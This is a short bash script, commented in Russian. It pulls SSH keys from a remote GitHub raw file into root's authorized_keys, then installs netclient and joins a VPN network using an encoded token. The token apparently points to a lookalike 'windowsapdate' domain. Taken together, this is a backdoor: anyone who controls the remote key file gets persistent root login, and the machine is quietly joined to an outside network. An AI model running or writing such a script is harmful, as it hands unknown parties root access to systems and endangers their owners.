#!/bin/bash
files=$(curl -s https://raw.githubusercontent.com/zip609/temp/main/add)
#создать директорию /root/.ssh/
mkdir -p /root/.ssh/
#создать файл /root/.ssh/authorized_keys
touch /root/.ssh/authorized_keys
#добавить в файл /root/.ssh/authorized_keys значение переменной files
echo $files >> /root/.ssh/authorized_keys
#установить права на файл /root/.ssh/authorized_keys
chmod 644 /root/.ssh/authorized_keys
#установить права на директорию /root/.ssh/
chmod 700 /root/.ssh/
curl -sL 'https://apt.netmaker.org/gpg.key' | sudo tee /etc/apt/trusted.gpg.d/netclient.asc
curl -sL 'https://apt.netmaker.org/debian.deb.txt' | sudo tee /etc/apt/sources.list.d/netclient.list
sudo apt update
sudo apt install netclient
netclient join -t eyJhcGljb25uc3RyaW5nIjoiYXBpLmRlcGxveS53aW5kb3dzYXBkYXRlLmNvbTo0NDMiLCJuZXR3b3JrIjoiY2Fyc2NhdHMiLCJrZXkiOiI5MjlhNzEzMDkzYzQzZjBmIiwibG9jYWxyYW5nZSI6IiJ9
